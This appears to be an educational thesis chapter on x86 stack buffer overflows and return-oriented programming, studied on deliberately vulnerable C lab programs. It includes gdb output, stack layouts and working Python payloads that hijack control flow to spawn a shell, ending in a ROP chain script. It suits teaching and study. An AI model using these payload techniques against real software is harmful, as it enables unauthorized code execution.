On the following example all binaries are compiled in x86 32-bits using the
`-m32` flag on `gcc`. We will divide our first case study in three parts. First
we will see how to call a function with a buffer overflow on a vulnerable
binary. Then we see how arguments can be controlled during execution, finally we
will build our first ROP chain.

Every code sample can be found in the GitHub repository
[here](https://github.com/jcouvy/bsc_thesis/tree/master/examples/)

# Calling a function

Below is the source code of a simple binary vulnerable to a stack smashing
attack. We will be attempting to call the unused function `exec_shell()` that
will in spawn us a shell.

```C
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void exec_shell()
{
	printf("Spawning a shell\n");
	system("/bin/sh");
}

void vuln_func(char * string)
{
	char buffer[100];
	strcpy(buffer, string);
}

int main(int argc, char* argv[])
{
	if (argc != 2) {
		fprintf(stderr, "Usage: <string>");
		exit(1);
	}
	vuln_func(argv[1]);
	return 0;
}
```

First off, we want to disassemble the program to learn information we will need
for our exploit. The targetted information are: the size of the buffer and the
address of exec_shell. The former will help us overflow the buffer without going
too far leading to a segmentation fault while the latter is mandatory to
overwrite the return address of the program.

Using the GNU Debugger `gdb` we get the following output:

```
❯ gdb -q simple_overflow
Reading symbols from simple_overflow...(no debugging symbols found)...done.
(gdb) disas vuln_func
Dump of assembler code for function vuln_func:
   0x08048524 <+0>:	push   %ebp
   0x08048525 <+1>:	mov    %esp,%ebp
   0x08048527 <+3>:	sub    $0x78,%esp
   0x0804852a <+6>:	sub    $0x8,%esp
   0x0804852d <+9>:	pushl  0x8(%ebp)
   0x08048530 <+12>:	lea    -0x6c(%ebp),%eax
   0x08048533 <+15>:	push   %eax
   0x08048534 <+16>:	call   0x80483a0 <strcpy@plt>
   0x08048539 <+21>:	add    $0x10,%esp
   0x0804853c <+24>:	nop
   0x0804853d <+25>:	leave  
   0x0804853e <+26>:	ret    
End of assembler dump.

(gdb) print exec_shell
$1 = {<text variable, no debug info>} 0x80484fb <exec_shell>
```

The machine instruction found at `0x08048530` gives us the size of the
buffer `0x6c`(100 in hex). We also located exec_shell at address `0x80484fb`. Here is the
state of the stack at this point:

```
| <argument>          |
| <return address>    |
| <old %ebp>          | <= %ebp
| <0x6c bytes of      |
|       ...           |
|       buffer>       |
| <argument>          |
| <address of buffer> | <= %esp
```

To overwrite the return address with the one of `exec_shell` we need to fill the
buffer with 0x6c bytes, overwrite SFP with a fake value and then the target
address. This is the state of the stack after our payload:

```
| <0x80484fb <exec_shell>    |
| 0x42424242 <fake old %ebp> | "BBBB" in hex
| 0x41414141 ...             | "AAAA" in hex
|   ... (0x6c bytes of 'A's) |
|   ... 0x41414141           |
```

We exploit the inner vulnerabilty of `strcpy()` with a python one-liner to
conduct our attack and spawn a shell.

```bash
❯ ./simple_overflow "$(python2 -c 'print "A"*0x6c + "BBBB" + "\xfb\x84\x04\x08"')"
Spawning a shell !
sh-4.4$ 
```

My machine uses an Intel CPU (all intel processors are little endian), thus it
is necessary to parse the address of the target function according to
endianness. A quick look at `lscpu` will display the CPU's endianness.

```
❯ lscpu
Architecture:          x86_64
CPU op-mode(s):        32-bit, 64-bit
Byte Order:            Little Endian
[...]
```

Note that `\x` in Python is the formatter for a Hex values.

# Passing arguments

Now that we called an arbitrary function we want to be able to pass argument(s). The following program slighlty varies from the previous example. This time, an unused function `tchoo_tchoo` is found in the program but calling it won't spawn a shell. Instead, we want to overwrite the parsed parameter in `system` with the correctio nargument.

```C
char* safe_string = "/bin/sh";

void tchoo_tchoo()
{	
	printf("Here comes the train \n:");
	system("/bin/sl");
}

void vuln_func(char* string)
{
	char buffer[100];
	strcpy(buffer, string);
}

int main(int argc, char** argv)
{
	if (argc != 2) {
		fprintf(stderr, "Usage: <string>");
		exit(1);
	}
	vuln_func(argv[1]);
	return 0;
}
```

Using `gdb` we search relevant information again, `x/s` displays the content stored at a given address in the specified format (s stands for string):

```
❯ gdb -q calling_args 
Reading symbols from calling_args...(no debugging symbols found)...done.

(gdb) x/s safe_string
0x8048620:	"/bin/sh"

(gdb) p system
$1 = {<text variable, no debug info>} 0x80483c0 <system@plt>
```

In order to call `system` with `safe_string` as an argument, we have to set up the stack properly. We will construct our payload such that the stack looks like a call to `system(safe_string)` after the return.

```
| 0x8048620  <safe_string>         |
| 0x43434343 <fake return address> | "CCCC"
| 0x80483c0  <address of system>   | 
| 0x42424242 <fake old %ebp>       | "BBBB"
| 0x41414141 ...                   |
|   ... (0x6c bytes of 'A's)       |
|   ... 0x41414141                 |
```

Finally we modify our Python script to launch the attack:

```bash
❯ ./calling_args "$(python2 -c 'print "A"*0x6c + "BBBB" + "\xc0\x83\x04\x08"+ "CCCC" + "\x20\x86\x04\x08"')"
sh-4.4$
```

# Creating a ROP chain

So far we only called single functions exisiting in the programs. ROP offers much more as it is possible to run arbitrary code rather than just calling available functions. We do this by chaining _gadgets_ which are short sequences of instructions ending in a _ret_. For example,i the following pair of gadgets will allow the attacker to write arbitrary values at arbitrary locations.

```asm
pop %ecx
pop %eax
ret

mov %eax, (%ecx)
ret
```

These work by poping values from the stack (which we control) into registers and then executing code that uses them. To use, we set up the stack like so:

```
| <address of mov %eax, (%ecx)>        |
| <value to write>                     | popped into %eax
| <address to write to>                | popped into %ecx
| <address of pop %ecx; pop %eax; ret> |
```
You'll see that the first gadget returns to the second gadget, continuing the chain of attacker controlled code execution (this next gadget can continue).

We will illustrate how to use ROP to construct a payload in the program below. Our goal is to chain three functions `add_bin`, `add_sh` and `exec_command` to spawn a shell.

```C
char command[100];

void exec_command()
{
	system(command);
}

void add_bin(int key)
{
	if (key == 0xdeadbeef) {
		strcat(command, "/bin");
	}
}

void add_sh(int key1, int key2)
{
	if (key1 == 0xcafebabe && key2 == 0x8badf00d) {
		strcat(command, "/sh");
	}
}

void vuln_func(char* string)
{
	char buffer[100];
	strcpy(buffer, string);
}

int main(int argc, char** argv)
{
	command[0] = 0;
	vuln_func(argv[1]);
	return 0;
}
```
In order to pass the tests required in each functions, we need to set up the stack and use `pop; ret` gadgets chain the function calls. For example, when we call `add_bin` the stack must look like: 

```
| 0xdeadbeef            |
| <address of pop; ret> |
| <address of add_bin>  |
```
When the program returns `0xdeadbeef` is popped from the stack into whichever register (we will ignore it from now on) and the `ret` instruction returns to the next address. The mechanism is the same for `add_sh`, below is the state of the stack after our payload.

```
	+-----------------------------+
	|            stack            |
	+-----------------------------+
	| <address of exec_command()> |
	| 0xcafebabe <key1>           |
	| 0x8badfood <key2>	          |
	| <address of POP; POP; RET>  |
	| <address of add_sh()>       |
	| 0xdeadbeef <key>            | <argument>
	| <address of POP; RET>       | <return addr>
	| <address of add_bin()>      | <function call>
	| 0x42424242 <fake old %ebp>  |
	| 0x41414141 ...              |
	|   ... (0x6c bytes of 'A's)  |
	|   ... 0x41414141            | 0x41414141 == "AAAA"

```

This time we will use a python wrapper (which will also show off the use of the very useful struct python module).

```python
#!/usr/bin/python2

import os
import struct # This module performs conversions between Python
              # values and C structs represented as Python strings.
              # It uses Format Strings as compact descriptions of the layout 
              # of the C structs and the intended conversion to/from Python values.

# Gadgets found with Ropper
pop_ret      = 0x0804848e
pop_pop_ret  = 0x0804848d


# Addresses of functions found using gdb.
add_bin      = 0x8048454
add_sh       = 0x8048490
exec_command = 0x804843b

payload  = "A"*0x6c
payload += "BBBB"

# "I" is the format for unsigned integer
payload += struct.pack("I", add_bin)
payload += struct.pack("I", pop_ret)
payload += struct.pack("I", 0xdeadbeef)

payload += struct.pack("I", add_sh)
payload += struct.pack("I", pop_pop_ret)
payload += struct.pack("I", 0xcafebabe)
payload += struct.pack("I", 0x8badf00d)

payload += struct.pack("I", exec_command)

os.system("./chaining_func \"%s\"" % payload)
```

```
❯ ./payload.py 
sh-4.4$ 
```
